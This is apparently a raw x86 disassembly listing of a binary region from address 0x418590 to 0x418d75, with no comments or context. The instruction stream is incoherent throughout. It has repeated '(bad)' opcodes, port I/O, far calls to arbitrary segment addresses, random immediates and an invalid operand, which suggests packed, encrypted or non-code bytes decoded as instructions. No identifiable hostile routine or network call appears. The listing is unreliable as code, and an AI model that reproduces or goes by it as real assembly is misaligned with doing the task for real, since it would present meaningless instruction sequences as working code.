  418590:	xchg   DWORD PTR [esi-0x529e1380],ecx
  418596:	in     al,0x18
  418598:	push   ebp
  418599:	cld    
  41859a:	sub    BYTE PTR [edx],al
  41859c:	sub    DWORD PTR [esi+eax*4],0xb3913fd8
  4185a3:	fwait
  4185a4:	lods   eax,DWORD PTR ds:[esi]
  4185a5:	sub    ebp,DWORD PTR [ecx+0x9]
  4185a8:	add    eax,0xa1613725
  4185ad:	dec    ebp
  4185ae:	call   0xa66f:0xd88f8683
  4185b5:	mov    ecx,DWORD PTR [ebp+esi*8+0x1583096e]
  4185bc:	gs cmp ebp,esp
  4185bf:	scas   eax,DWORD PTR es:[edi]
  4185c0:	jns    0x4185d8
  4185c2:	pop    esi
  4185c3:	mov    ecx,esp
  4185c5:	xchg   BYTE PTR [esi+0x67],ch
  4185c8:	xchg   esi,ebp
  4185ca:	xlat   BYTE PTR ds:[ebx]
  4185cb:	jge    0x418596
  4185cd:	data16 arpl WORD PTR [esi+ebx*4],bx
  4185d1:	leave  
  4185d2:	adc    BYTE PTR [edx],cl
  4185d4:	loop   0x418636
  4185d6:	push   eax
  4185d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185d8:	xchg   ebp,eax
  4185d9:	push   esi
  4185da:	nop
  4185db:	add    eax,0x7e7c967e
  4185e0:	adc    BYTE PTR [eax+0x46d12b1d],ch
  4185e6:	aas    
  4185e7:	int    0xb1
  4185e9:	push   cs
  4185ea:	sbb    esp,DWORD PTR [esi+0xc]
  4185ed:	mov    eax,eax
  4185ef:	and    BYTE PTR [ebx-0x6a2b20c7],0x2b
  4185f6:	add    dh,dl
  4185f8:	je     0x418623
  4185fa:	in     eax,0x4c
  4185fc:	into   
  4185fd:	loope  0x418647
  4185ff:	push   ebx
  418600:	xor    bh,ah
  418602:	mov    dl,BYTE PTR [ecx-0x72]
  418605:	dec    ecx
  418606:	add    BYTE PTR [edi-0x3a7aadc8],ch
  41860c:	push   cs
  41860d:	pop    es
  41860e:	repz fisub WORD PTR [ebx+0x74]
  418612:	enter  0x80c,0x1c
  418616:	sti    
  418617:	pop    esp
  418618:	shr    DWORD PTR [eax+0x47],0x4b
  41861c:	les    ecx,FWORD PTR [ebx]
  41861e:	pushf  
  41861f:	mov    ecx,0x6d4ee019
  418624:	inc    esp
  418625:	pop    edx
  418626:	ret    
  418627:	ins    DWORD PTR es:[edi],dx
  418628:	xlat   BYTE PTR ds:[ebx]
  418629:	cmp    BYTE PTR [eax],cl
  41862b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41862c:	clc    
  41862d:	retf   
  41862e:	sub    DWORD PTR [esi+0x1d],ebx
  418631:	scas   eax,DWORD PTR es:[edi]
  418632:	mov    BYTE PTR [edi+0x70],ch
  418635:	add    DWORD PTR [ecx],0xffffffa6
  418638:	cmp    eax,0xaeea9473
  41863d:	fucomip st,st(5)
  41863f:	aad    0xe1
  418641:	push   ebx
  418642:	sub    al,0x7a
  418644:	shl    ah,cl
  418646:	sub    esp,DWORD PTR [edx+0x64]
  418649:	sub    al,0xf8
  41864b:	inc    esp
  41864c:	(bad)  
  41864e:	shl    DWORD PTR [ecx-0x6f],0x6d
  418652:	mov    al,0x28
  418654:	retf   0x5558
  418657:	bound  ebx,QWORD PTR [esi-0x41]
  41865a:	xlat   BYTE PTR ds:[ebx]
  41865b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41865c:	push   edx
  41865d:	shufps xmm2,XMMWORD PTR [ecx-0xe],0xc3
  418662:	jb     0x4186c1
  418664:	mov    BYTE PTR [ebp-0xb],dl
  418667:	aad    0x53
  418669:	ds mov bl,0x3e
  41866c:	dec    esi
  41866d:	sub    al,0x3e
  41866f:	sub    dh,BYTE PTR [edx-0x657d3c64]
  418675:	cmp    BYTE PTR [ecx-0x353e477c],cl
  41867b:	loop   0x418657
  41867d:	arpl   WORD PTR [edi-0x1df3bddb],di
  418683:	pop    eax
  418684:	mov    bl,0x51
  418686:	sbb    eax,0x764b4904
  41868b:	cmp    BYTE PTR [esi+0x151ca839],cl
  418691:	in     al,0xbe
  418693:	jnp    0x41867b
  418695:	push   ss
  418696:	mov    ebx,0xd622b9f4
  41869b:	ss dec esp
  41869d:	enter  0x2b59,0xb
  4186a1:	loope  0x41870b
  4186a3:	into   
  4186a4:	push   0x1c
  4186a6:	lods   al,BYTE PTR ds:[esi]
  4186a7:	call   0x144c:0x9a76d54f
  4186ae:	push   esp
  4186af:	mov    bh,bl
  4186b1:	fcmovnu st,st(3)
  4186b3:	ret    0xe183
  4186b6:	jb     0x418638
  4186b8:	int    0xd9
  4186ba:	cli    
  4186bb:	sar    BYTE PTR [edx-0xe],0x5c
  4186bf:	(bad)
  4186c3:	adc    dl,al
  4186c5:	xor    BYTE PTR [esp+edi*2-0x65a68919],ah
  4186cc:	cli    
  4186cd:	sub    eax,0xfc978f76
  4186d2:	push   0x9bded903
  4186d7:	mov    dl,0x7a
  4186d9:	ins    DWORD PTR es:[edi],dx
  4186da:	retf   0x56b3
  4186dd:	xchg   BYTE PTR [ecx+0x1d],al
  4186e0:	and    ecx,DWORD PTR [esi+0x578478e7]
  4186e6:	call   0x8b51ca2
  4186eb:	data16 jge 0x41867d
  4186ee:	fisubr DWORD PTR [ebx]
  4186f0:	sbb    dh,BYTE PTR [ecx-0x48]
  4186f3:	rcl    BYTE PTR [ebx],0x76
  4186f6:	jae    0x418713
  4186f8:	push   ecx
  4186f9:	inc    edx
  4186fa:	jnp    0x41870f
  4186fc:	or     al,0x88
  4186fe:	mov    edx,0x1b750709
  418703:	mov    eax,0xcb34e949
  418708:	jb     0x4186e7
  41870a:	imul   eax,DWORD PTR [ebp+0x38e1d35b],0xa29d6a10
  418714:	fwait
  418715:	mov    BYTE PTR [ebx+ebp*8],dh
  418718:	call   0x6a0e8691
  41871d:	push   eax
  41871e:	test   eax,0x1c2b70ed
  418723:	(bad)  
  418724:	sahf   
  418725:	iret   
  418726:	shr    bl,1
  418728:	lock adc eax,0xcdc275b9
  41872e:	out    dx,al
  41872f:	jno    0x418740
  418731:	cmp    eax,0x88979948
  418736:	xchg   esp,eax
  418737:	sub    ebx,esi
  418739:	call   FWORD PTR [eax-0x29]
  41873c:	(bad)  
  41873d:	fadd   DWORD PTR [ecx-0x5d767c54]
  418743:	test   DWORD PTR [bx-0x791c],ebp
  418748:	rol    DWORD PTR [esi-0x23],0x45
  41874c:	test   eax,0xb1555687
  418751:	sbb    BYTE PTR [ebp-0x328196e3],0x44
  418758:	fsubr  QWORD PTR [edx-0x4d]
  41875b:	arpl   cx,sp
  41875d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41875e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41875f:	push   ebx
  418760:	leave  
  418761:	or     ecx,edx
  418763:	sar    BYTE PTR [esi],0x61
  418766:	jae    0x4187de
  418768:	mov    ecx,0x85797743
  41876d:	retf   0xcf0e
  418770:	mov    WORD PTR [edi+0x8ba9d25],gs
  418776:	call   0x32bec947
  41877b:	aam    0x95
  41877d:	sti    
  41877e:	or     edi,edx
  418780:	fcomi  st,st(6)
  418782:	or     al,BYTE PTR [ecx+0x47]
  418785:	shl    esi,cl
  418787:	dec    ecx
  418788:	pop    es
  418789:	(bad)  
  41878a:	popf   
  41878b:	je     0x41878e
  41878d:	add    BYTE PTR [ebx],bl
  41878f:	adc    cl,BYTE PTR [eax+0x7494375d]
  418795:	aad    0xb
  418797:	cmp    ch,BYTE PTR [ebx-0x20]
  41879a:	loope  0x4187af
  41879c:	sbb    BYTE PTR [edx+0x21143afc],dl
  4187a2:	rol    DWORD PTR [ecx+eiz*1-0x161af6fb],1
  4187a9:	push   ebp
  4187aa:	cdq    
  4187ab:	and    BYTE PTR [edx+0x12d6dfe6],ch
  4187b1:	addr16 popa 
  4187b3:	sbb    ch,BYTE PTR es:[esi]
  4187b6:	mov    ecx,0x4ccc934c
  4187bb:	aam    0x5d
  4187bd:	(bad)  
  4187be:	out    dx,al
  4187bf:	call   0xae63:0x686c41c7
  4187c6:	fidiv  WORD PTR [edi+0x77]
  4187c9:	inc    BYTE PTR [edx+0x61]
  4187cc:	push   0xffffffdb
  4187ce:	je     0x418816
  4187d0:	out    dx,al
  4187d1:	add    esp,edi
  4187d3:	mov    ebx,0x389afa6c
  4187d8:	outs   dx,DWORD PTR ds:[esi]
  4187d9:	ja     0x418840
  4187db:	in     eax,dx
  4187dc:	nop
  4187dd:	jle    0x4187f1
  4187df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187e0:	rcl    BYTE PTR [esi+0x3d5f5a49],cl
  4187e6:	cli    
  4187e7:	jo     0x4187bc
  4187e9:	or     al,BYTE PTR [edx]
  4187eb:	pop    ds
  4187ec:	retf   0x66fd
  4187ef:	aam    0x93
  4187f1:	repz and dl,BYTE PTR [edi]
  4187f4:	int3   
  4187f5:	mov    dh,0x77
  4187f7:	push   eax
  4187f8:	xor    BYTE PTR [ebx+0x73bc7234],dh
  4187fe:	retf   
  4187ff:	iret   
  418800:	addr16 push ds
  418802:	sbb    bl,0x85
  418805:	daa    
  418806:	nop
  418807:	mov    dl,BYTE PTR [edi+0xa]
  41880a:	dec    edx
  41880b:	sti    
  41880c:	mov    ebx,0xad627d3f
  418811:	push   es
  418812:	pop    esp
  418813:	sbb    esi,esp
  418815:	inc    esp
  418816:	dec    ecx
  418817:	mov    ecx,0x9fdce64e
  41881c:	mov    al,0x46
  41881e:	dec    edi
  41881f:	les    esp,FWORD PTR ds:0x46614598
  418825:	pop    ecx
  418826:	and    al,0x1c
  418828:	jns    0x4187ec
  41882a:	xchg   edi,eax
  41882b:	or     edx,DWORD PTR [ebp-0x8]
  41882e:	xlat   BYTE PTR ds:[ebx]
  41882f:	retf   0xbe7
  418832:	sub    al,0x6a
  418834:	cmp    esi,DWORD PTR [edx-0x31bd0cb5]
  41883a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41883b:	mov    eax,0x5b6e419
  418840:	or     al,0x77
  418842:	(bad)  
  418843:	loop   0x418814
  418845:	push   cs
  418846:	sub    edx,esp
  418848:	and    al,0xb1
  41884a:	mov    bh,0x5
  41884c:	ret    
  41884d:	pop    edx
  41884e:	(bad)  
  418850:	ja     0x4187ec
  418852:	je     0x4187da
  418854:	mov    WORD PTR [ecx-0x791e420b],ds
  41885a:	test   BYTE PTR [ebx],bl
  41885c:	test   DWORD PTR [ecx-0x37],ebp
  41885f:	(bad)  
  418860:	out    0xae,al
  418862:	out    0x8a,al
  418864:	outs   dx,BYTE PTR ds:[esi]
  418865:	dec    edx
  418866:	jnp    0x418824
  418868:	lock adc al,0xd7
  41886b:	sar    WORD PTR es:[ebp-0x2ca00728],0xe7
  418874:	(bad)  
  418875:	dec    esi
  418876:	in     al,dx
  418877:	pusha  
  418878:	push   ss
  418879:	arpl   WORD PTR [ebx-0x52304742],si
  41887f:	shl    DWORD PTR [ebp-0x1f131a25],cl
  418885:	test   dl,bl
  418887:	fnstenv [eax+edx*1-0x1066fa78]
  41888e:	fidiv  WORD PTR [esi-0x16]
  418891:	jne    0x4188dc
  418893:	retf   
  418894:	jno    0x4188a1
  418896:	mov    DWORD PTR [eax-0x40c89a52],edx
  41889c:	inc    ebx
  41889d:	mov    esi,0x9ff5569f
  4188a2:	cmp    ecx,DWORD PTR [ebp-0x1d5554e8]
  4188a8:	adc    dh,BYTE PTR [ecx+eax*4+0xa]
  4188ac:	mov    bh,0x67
  4188ae:	mov    eax,ds:0x4647fe46
  4188b3:	dec    ecx
  4188b4:	aad    0x8f
  4188b6:	cli    
  4188b7:	mov    ?,WORD PTR [ecx+0x4]
  4188ba:	xor    dh,BYTE PTR [ecx]
  4188bc:	mov    BYTE PTR [ebp+0x2f7cd7c6],ch
  4188c2:	outs   dx,BYTE PTR ds:[esi]
  4188c3:	or     bh,BYTE PTR [ebx+0xc]
  4188c6:	xor    eax,0x39d2d520
  4188cb:	clc    
  4188cc:	xchg   ebx,eax
  4188cd:	or     al,0x6
  4188d0:	add    al,0x1d
  4188d2:	es mov eax,0x655d2e5d
  4188d8:	stos   DWORD PTR es:[edi],eax
  4188d9:	inc    esi
  4188da:	jnp    0x4188ec
  4188dc:	fdiv   QWORD PTR [edi+0x57]
  4188df:	jg     0x41891b
  4188e1:	push   0xffffffea
  4188e3:	sub    DWORD PTR ss:0x6184199f,ecx
  4188ea:	adc    DWORD PTR [edi+0x28],ecx
  4188ed:	jae    0x418883
  4188ef:	push   ecx
  4188f0:	shl    BYTE PTR [ecx],cl
  4188f2:	test   DWORD PTR [edx-0x5f],ebp
  4188f5:	icebp  
  4188f6:	dec    esp
  4188f7:	and    eax,0xbaa81c
  4188fc:	pop    esi
  4188fd:	sbb    DWORD PTR [edx],0x87515e12
  418903:	or     bh,BYTE PTR [ecx-0x2d]
  418906:	pop    ebx
  418907:	mov    bl,0x30
  418909:	push   ebx
  41890a:	sub    edi,DWORD PTR [ebp+0x4d]
  41890d:	(bad)  
  41890e:	jl     0x4188da
  418910:	cmc    
  418911:	cdq    
  418912:	enter  0xb87d,0xa3
  418916:	xor    eax,0x386ac0cd
  41891b:	test   BYTE PTR [edi-0x6de17ccc],dh
  418921:	adc    DWORD PTR [esi-0x15],eax
  418924:	inc    ecx
  418925:	loope  0x4188f5
  418927:	out    dx,al
  418928:	in     eax,0xd4
  41892a:	lahf   
  41892b:	inc    ebp
  41892c:	pop    es
  41892d:	das    
  41892e:	inc    eax
  41892f:	dec    esp
  418930:	adc    al,0x8b
  418932:	loope  0x4188e3
  418934:	mov    cl,0x88
  418936:	repnz push es
  418938:	cmp    ch,0xc4
  41893b:	lahf   
  41893c:	dec    ebx
  41893d:	mov    dh,0x2f
  41893f:	repnz in eax,dx
  418941:	mov    BYTE PTR [eax],dl
  418943:	jns    0x41891a
  418945:	sbb    cl,ah
  418947:	sbb    DWORD PTR [ebx],ecx
  418949:	push   ss
  41894a:	into   
  41894b:	mov    ds:0x85f5c225,al
  418950:	fidiv  WORD PTR [esi+0x71]
  418953:	push   ecx
  418954:	xor    al,0x49
  418956:	sti    
  418957:	or     bh,BYTE PTR [ebp+0x56e85b77]
  41895d:	ins    BYTE PTR es:[edi],dx
  41895e:	jbe    0x418924
  418960:	xchg   esp,eax
  418961:	pop    ss
  418962:	nop
  418963:	lea    ecx,[ebp+0x26]
  418966:	mov    cl,al
  418968:	gs ud0 ebx,ebx
  41896c:	and    DWORD PTR [edi+0x2b],ebx
  41896f:	sbb    DWORD PTR [ecx-0x269c32f1],ecx
  418975:	sub    edx,DWORD PTR [eax]
  418977:	call   0xfc39e220
  41897c:	adc    ch,bl
  41897e:	fnstenv [esi]
  418980:	xor    esi,DWORD PTR [ebx-0x19]
  418983:	xor    BYTE PTR [ecx+0x520eaeb7],ch
  418989:	add    esp,ebx
  41898b:	pop    edx
  41898c:	imul   ebx,DWORD PTR [eax],0xffffff98
  41898f:	inc    eax
  418990:	adc    DWORD PTR [edx+0x29],ecx
  418993:	arpl   WORD PTR [ebx-0x2fb34822],dx
  418999:	sahf   
  41899a:	test   eax,0x4c8b29
  41899f:	scas   eax,DWORD PTR es:[edi]
  4189a0:	mov    al,ds:0xde029103
  4189a5:	jmp    0x418954
  4189a7:	jo     0x4189bc
  4189a9:	mov    DWORD PTR [edi+0x4d5c3ceb],esp
  4189af:	xchg   esi,eax
  4189b0:	and    esi,DWORD PTR [eax+eiz*8-0x677f78c]
  4189b7:	mov    bh,0xd6
  4189b9:	pop    ss
  4189ba:	stos   BYTE PTR es:[edi],al
  4189bb:	cmp    edi,DWORD PTR es:[edx-0x18]
  4189bf:	ins    DWORD PTR es:[edi],dx
  4189c0:	retf   
  4189c1:	div    bh
  4189c3:	(bad)  
  4189c4:	xchg   edi,eax
  4189c5:	cmp    dh,BYTE PTR [ebp+eax*4-0x3]
  4189c9:	dec    ebx
  4189ca:	retf   0xff6b
  4189cd:	mov    cl,0x57
  4189cf:	fwait
  4189d0:	jbe    0x4189fe
  4189d2:	sbb    eax,DWORD PTR [edx+0x1a9709ca]
  4189d8:	outs   dx,DWORD PTR ds:[esi]
  4189d9:	inc    BYTE PTR ds:0x2bee1618
  4189df:	and    eax,0x2e9961f4
  4189e4:	inc    ebp
  4189e5:	add    ebp,DWORD PTR [ecx-0x6e]
  4189e8:	xor    cl,BYTE PTR [esi+ecx*2+0x2f]
  4189ec:	repz push ds
  4189ee:	dec    ebx
  4189ef:	ins    DWORD PTR es:[edi],dx
  4189f0:	aad    0xed
  4189f2:	ret    
  4189f3:	mov    edx,0x83746c61
  4189f8:	mov    eax,0x50c17800
  4189fd:	mov    ebx,0xcd3baae8
  418a02:	retf   0x71dc
  418a05:	add    al,0x21
  418a07:	xchg   DWORD PTR [ecx-0x44a12d15],eax
  418a0d:	cmp    BYTE PTR [edi],0x30
  418a10:	or     eax,0x6b367326
  418a15:	call   0xf94c:0x7777019a
  418a1c:	jmp    0xf746682a
  418a21:	inc    edx
  418a22:	xor    al,0x74
  418a24:	pop    esi
  418a25:	(bad)  
  418a26:	or     al,0x9a
  418a28:	xchg   esi,eax
  418a29:	dec    edi
  418a2a:	mov    ah,0xe4
  418a2c:	scas   eax,DWORD PTR es:[edi]
  418a2d:	out    dx,al
  418a2e:	test   DWORD PTR [ebp+eax*8-0x1c47ffdc],0x13a86dd2
  418a39:	mov    eax,0x42077cf5
  418a3e:	push   0x2a6205af
  418a43:	lock and BYTE PTR [esi-0x69bb04c3],ch
  418a4a:	(bad)  
  418a4b:	out    dx,eax
  418a4c:	in     eax,0x21
  418a4e:	jb     0x418a48
  418a50:	or     eax,0x92ac0714
  418a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a56:	jcxz   0x4189e1
  418a59:	pop    edx
  418a5a:	mov    ss,WORD PTR [esp+ebx*1]
  418a5d:	jl     0x4189ee
  418a5f:	imul   DWORD PTR [edi-0x312465ef]
  418a65:	mov    ebp,0x56cc43b7
  418a6a:	dec    esp
  418a6b:	rol    DWORD PTR cs:[esi],0xee
  418a6f:	dec    ebp
  418a70:	pop    esi
  418a71:	aam    0xad
  418a73:	mov    eax,0x394b38f4
  418a78:	das    
  418a79:	popf   
  418a7a:	jecxz  0x4189fd
  418a7c:	fnstsw ax
  418a7e:	mov    edi,DWORD PTR [edx-0x2d]
  418a81:	scas   al,BYTE PTR es:[edi]
  418a82:	sbb    DWORD PTR [edx],ebp
  418a84:	xor    DWORD PTR [edx-0x7cbdcbf],ecx
  418a8a:	inc    esp
  418a8b:	cmp    ah,BYTE PTR [ebp+0x51]
  418a8e:	push   edi
  418a8f:	int    0x16
  418a91:	xor    eax,0xb337955c
  418a96:	test   al,0x13
  418a98:	aam    0xc5
  418a9a:	out    dx,eax
  418a9b:	(bad)  [esi+0x58]
  418a9e:	enter  0x33b7,0x9d
  418aa2:	ds dec ebx
  418aa4:	in     eax,dx
  418aa5:	call   0x8c42:0x1a0af2ad
  418aac:	(bad)  
  418aad:	out    dx,eax
  418aae:	mov    dl,0xe4
  418ab0:	jl     0x418b30
  418ab2:	mov    esi,DWORD PTR [edx+0xdcedaf6]
  418ab8:	int    0x70
  418aba:	xchg   ecx,eax
  418abb:	push   ds
  418abc:	mov    ebp,0xd7115125
  418ac1:	pushf  
  418ac2:	and    DWORD PTR [ebx-0x48],eax
  418ac5:	in     al,dx
  418ac6:	mov    esp,0x52b1743f
  418acb:	and    BYTE PTR [ebx+0x4d],al
  418ace:	(bad)  [ebx+ebp*1+0x0]
  418ad2:	jp     0x418a7d
  418ad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ad5:	jbe    0x418ace
  418ad7:	repz popf 
  418ad9:	mov    ecx,0x5d59c0ed
  418ade:	push   ds
  418adf:	mov    ch,0x6
  418ae1:	ja     0x418ad9
  418ae3:	arpl   WORD PTR [ecx-0x9],bx
  418ae6:	dec    ebp
  418ae7:	sbb    DWORD PTR [edx-0x579d576],eax
  418aed:	push   edx
  418aee:	sbb    DWORD PTR [ebp+0x58109e32],ebx
  418af4:	push   0x98a07d21
  418af9:	scas   al,BYTE PTR es:[edi]
  418afa:	xchg   ebp,eax
  418afb:	cli    
  418afc:	mov    ebx,0x3124bc54
  418b01:	aam    0x7c
  418b03:	pop    ds
  418b04:	jmp    0x531e830a
  418b09:	adc    DWORD PTR [esi-0x5e0ac2e5],0x6db0466e
  418b13:	rol    DWORD PTR [edi+0x63],cl
  418b16:	cli    
  418b17:	jae    0x418acb
  418b19:	test   al,0xee
  418b1b:	int    0xa1
  418b1d:	cmp    dh,dh
  418b1f:	mov    esp,es
  418b21:	xchg   esi,eax
  418b22:	in     al,0x3d
  418b24:	sbb    BYTE PTR [esi+0x5b],al
  418b27:	aaa    
  418b28:	dec    ebx
  418b29:	mov    cl,0x27
  418b2b:	push   cs
  418b2c:	sub    al,0x72
  418b2e:	rcl    BYTE PTR [esp+eax*1-0x5cb5ca75],cl
  418b35:	clc    
  418b36:	mov    ecx,0x2475a695
  418b3b:	cwde   
  418b3c:	add    esp,DWORD PTR [edi]
  418b3e:	mov    edi,esp
  418b40:	ins    DWORD PTR es:[edi],dx
  418b41:	mov    dh,0x9e
  418b43:	jl     0x418b93
  418b45:	icebp  
  418b46:	imul   ebx,DWORD PTR [esp+esi*2-0x31],0x6c37788
  418b4e:	adc    al,0x48
  418b50:	shr    bh,1
  418b52:	xchg   ecx,eax
  418b53:	jns    0x418b60
  418b55:	(bad)  [ecx]
  418b57:	jb     0x418b48
  418b59:	imul   ebx,esi,0xc28f430e
  418b5f:	scas   eax,DWORD PTR es:[edi]
  418b60:	test   al,0x6d
  418b62:	add    cl,BYTE PTR [ebp+0x0]
  418b65:	and    DWORD PTR [edx+0x3f959c],edi
  418b6b:	cs mov ah,0x83
  418b6e:	or     DWORD PTR [ebx-0x26],0xee1e8747
  418b75:	(bad)  
  418b76:	(bad)  [ebp+0x10eb1677]
  418b7c:	shl    DWORD PTR [eax-0x5712b19],0xa7
  418b83:	(bad)  
  418b84:	mov    eax,ds:0x26f36a41
  418b89:	pop    ebx
  418b8a:	mov    BYTE PTR [esi+0x3fe5c8c8],dl
  418b90:	sub    eax,0x92515656
  418b95:	ins    DWORD PTR es:[edi],dx
  418b96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b97:	dec    edx
  418b98:	addr16 mov dl,0x3f
  418b9b:	fwait
  418b9c:	inc    esp
  418b9d:	movzx  esp,WORD PTR [esi+eax*8]
  418ba1:	sbb    DWORD PTR [ecx+0x10],esi
  418ba4:	leave  
  418ba5:	xlat   BYTE PTR ds:[ebx]
  418ba6:	mov    edi,DWORD PTR [eax-0x59]
  418ba9:	jo     0x418c07
  418bab:	mov    al,bh
  418bad:	pop    esi
  418bae:	xor    esp,DWORD PTR [ebp+0xe]
  418bb1:	or     BYTE PTR [ebx],ah
  418bb3:	sbb    eax,0x10775824
  418bb8:	aas    
  418bb9:	(bad)  
  418bbb:	add    eax,DWORD PTR [edx-0x56]
  418bbe:	stos   DWORD PTR es:[edi],eax
  418bbf:	sub    DWORD PTR [edi-0x19],0xffffffba
  418bc3:	pop    ebp
  418bc4:	iret   
  418bc5:	sahf   
  418bc6:	ds pop esi
  418bc8:	retf   
  418bc9:	mov    bh,0xfe
  418bcb:	dec    esi
  418bcc:	mov    ch,0x79
  418bce:	out    dx,al
  418bcf:	sti    
  418bd0:	or     ecx,DWORD PTR [edi-0x1f3c6bff]
  418bd6:	add    eax,0x5e40eeac
  418bdb:	dec    ecx
  418bdc:	dec    edi
  418bdd:	aaa    
  418bde:	loop   0x418b81
  418be0:	rol    BYTE PTR [eax-0x45],0xf3
  418be4:	push   ds
  418be5:	popf   
  418be6:	pop    es
  418be7:	push   edi
  418be8:	mov    ds:0xaa442ab1,eax
  418bed:	push   0x81a0aa70
  418bf2:	std    
  418bf3:	(bad)  
  418bf4:	pop    eax
  418bf5:	(bad)  
  418bf7:	and    DWORD PTR [ecx+0x26],edi
  418bfa:	jno    0x418b7c
  418bfc:	push   es
  418bfd:	inc    ebx
  418bfe:	popa   
  418bff:	inc    ebp
  418c00:	xor    BYTE PTR [esi],bl
  418c02:	or     BYTE PTR [edi+0x6f],bl
  418c05:	mov    ds:0xb2c6a111,eax
  418c0a:	mov    ebx,ebp
  418c0c:	or     dl,BYTE PTR [edi]
  418c0e:	sub    eax,0x132ec65a
  418c13:	sti    
  418c14:	jmp    DWORD PTR [edx+0x18]
  418c17:	cli    
  418c18:	out    dx,al
  418c19:	enter  0x826a,0xcf
  418c1d:	sub    al,0xb8
  418c1f:	hlt    
  418c20:	fimul  DWORD PTR [edx-0x7f]
  418c23:	cmp    BYTE PTR [ebx-0x3dae9401],ch
  418c29:	jb     0x418c6f
  418c2b:	retf   0x10a1
  418c2e:	test   DWORD PTR ds:0x84258f7d,ecx
  418c34:	unpckhps xmm6,XMMWORD PTR [edi+esi*2]
  418c38:	push   ebp
  418c39:	xchg   ebx,eax
  418c3a:	add    eax,0x2be700ca
  418c3f:	leave  
  418c40:	dec    esp
  418c41:	in     al,0x17
  418c43:	ror    BYTE PTR [ecx],cl
  418c45:	xor    BYTE PTR [ebx+0x5db27331],ch
  418c4b:	mov    ds:0x6725d6d2,al
  418c50:	or     eax,0xa02450dc
  418c55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c56:	ds pop esi
  418c58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c59:	cli    
  418c5a:	loope  0x418cbd
  418c5c:	cmp    al,0x83
  418c5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c5f:	sbb    al,0xa7
  418c61:	sbb    BYTE PTR [edx+edi*2+0x7e94900b],bl
  418c68:	shl    BYTE PTR [edx+0x1fa91cb8],cl
  418c6e:	ja     0x418bf6
  418c70:	xor    al,0xdd
  418c72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c74:	and    BYTE PTR [esi-0x518dbd82],bh
  418c7a:	lods   al,BYTE PTR ds:[esi]
  418c7b:	mov    bl,BYTE PTR [ecx-0x6e]
  418c7e:	inc    ebp
  418c7f:	aas    
  418c80:	mov    dh,0x7f
  418c82:	cwde   
  418c83:	rol    BYTE PTR [edi+0x4a10690b],1
  418c89:	pushf  
  418c8a:	adc    BYTE PTR [ecx-0x26],cl
  418c8d:	sbb    ebx,DWORD PTR [esi-0x4]
  418c90:	xor    eax,0x4488c936
  418c95:	popa   
  418c96:	fmul   QWORD PTR [edi]
  418c98:	xchg   esi,eax
  418c99:	loop   0x418c26
  418c9b:	pop    ecx
  418c9c:	shr    DWORD PTR ds:[eax+eax*2+0xf7f4cf2],0x37
  418ca5:	sti    
  418ca6:	pop    es
  418ca7:	xchg   ecx,eax
  418ca8:	ret    0xa558
  418cab:	retf   
  418cac:	popf   
  418cad:	pop    ebp
  418cae:	fisubr WORD PTR [edi+0x73245f22]
  418cb4:	js     0x418d2f
  418cb6:	repnz outs dx,BYTE PTR ds:[esi]
  418cb8:	mul    DWORD PTR [ebp+0xa]
  418cbb:	mov    fs,WORD PTR [ecx+0x231577b5]
  418cc1:	icebp  
  418cc2:	sbb    esp,DWORD PTR [eax+0x768169d4]
  418cc8:	leave  
  418cc9:	add    DWORD PTR [eax+0x2f],eax
  418ccc:	stos   BYTE PTR es:[edi],al
  418ccd:	xlat   BYTE PTR ds:[ebx]
  418cce:	and    esi,DWORD PTR [ebp+0x17af4bc5]
  418cd4:	mov    al,ah
  418cd6:	push   ecx
  418cd7:	popf   
  418cd8:	outs   dx,DWORD PTR ds:[esi]
  418cd9:	push   0x12de68cd
  418cde:	imul   ecx,DWORD PTR [esi-0x21],0x9a327661
  418ce5:	imul   edx,DWORD PTR [ebx+0x13f2c663],0xfb95208d
  418cef:	(bad)  
  418cf0:	int    0xce
  418cf2:	xchg   edi,eax
  418cf3:	mov    ecx,0x9fe8c47
  418cf8:	fld    QWORD PTR [ebx]
  418cfa:	pop    ss
  418cfb:	xchg   DWORD PTR [edx-0x6c8051e6],esp
  418d01:	test   DWORD PTR [ecx],ecx
  418d03:	lea    esi,cs:0x97e96e14
  418d0a:	fwait
  418d0b:	cdq    
  418d0c:	jno    0x418d3f
  418d0e:	test   BYTE PTR [eax-0x77],al
  418d11:	rol    BYTE PTR [edx],1
  418d13:	fcom   QWORD PTR [ecx+0x6ea53382]
  418d19:	xor    edx,DWORD PTR [esi+0x1f15758c]
  418d1f:	pop    ds
  418d20:	jno    0x418d50
  418d22:	popf   
  418d23:	inc    ebx
  418d24:	dec    edx
  418d25:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  418d27:	int3   
  418d28:	mov    edi,0xbb2776a0
  418d2d:	mov    ebx,ebx
  418d2f:	(bad)  
  418d31:	fcomp  DWORD PTR [esi+0x48362f8]
  418d37:	test   DWORD PTR [ecx-0x1b42414c],esi
  418d3d:	inc    di
  418d3f:	adc    cl,BYTE PTR ds:0x95b35be8
  418d46:	inc    ebx
  418d47:	shl    BYTE PTR [ecx-0x139c3eb6],cl
  418d4d:	fs dec edx
  418d4f:	es ds pop ebp
  418d52:	lods   eax,DWORD PTR ds:[esi]
  418d53:	xchg   DWORD PTR [ecx],ebp
  418d55:	clc    
  418d56:	arpl   WORD PTR [ebx+0x7726a53e],dx
  418d5c:	add    eax,0x8108f86b
  418d61:	sub    al,0xe9
  418d63:	data16 jecxz 0x418d21
  418d66:	rcpps  xmm1,XMMWORD PTR [esi+eiz*1+0x573c0f93]
  418d6e:	mov    eax,0xa43b82c2
  418d73:	fcmovne st,st(4)
  418d75:	loope  0x418d56
